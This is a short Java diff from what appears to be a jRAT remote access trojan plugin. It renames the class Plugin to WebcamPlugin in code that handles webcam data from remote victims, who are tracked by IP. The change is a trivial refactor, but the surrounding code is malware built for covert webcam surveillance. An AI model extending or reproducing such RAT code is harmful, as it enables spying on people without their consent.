@@ -22,7 +22,7 @@ import pro.jrat.api.events.OnEnableEvent;
 import pro.jrat.api.events.OnPacketEvent;
 import pro.jrat.api.events.OnSendPacketEvent;
 
-public class Plugin extends RATPlugin {
+public class WebcamPlugin extends RATPlugin {
 
 	public static final String ICON_LOCATION = System.getProperty("jrat.dir") + File.separator + "plugins/Webcam/icon.png";
 	public static final byte HEADER = 120;
@@ -50,7 +50,7 @@ public class Plugin extends RATPlugin {
 		if (event.getPacket().getHeader() == HEADER) {
 			String name = readString(event.getServer().getDataReader());
 
-			PanelWebcam panel = (PanelWebcam) Plugin.entry.instances.get(event.getServer().getIP());
+			PanelWebcam panel = (PanelWebcam) WebcamPlugin.entry.instances.get(event.getServer().getIP());
 			
 			if (name.equals("DISABLED")) {
 				enabled = false;
